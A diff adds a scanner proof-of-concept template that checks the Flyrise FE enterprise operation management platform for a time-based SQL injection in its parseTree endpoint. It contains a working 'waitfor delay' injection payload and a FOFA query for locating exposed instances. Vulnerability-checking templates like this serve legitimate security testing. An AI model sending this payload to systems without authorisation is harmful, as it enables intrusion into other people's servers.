@@ -1,0 +1,24 @@
+id: poc-yaml-flyrise-enterprise-operation-management-platform-parsetree-sqli
+info:
+  name: 飞企互联-FE 企业运营管理平台 parsetree SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 企业运营管理平台
+  fofa: app="飞企互联-FE企业运营管理平台"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /common/parseTree.js%70?code=1%27;waitfor+delay+%270:0:{{.t1}}%27--
+  expression: 'status_code == 500 &&
+
+    contains(body,"服务器错误") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
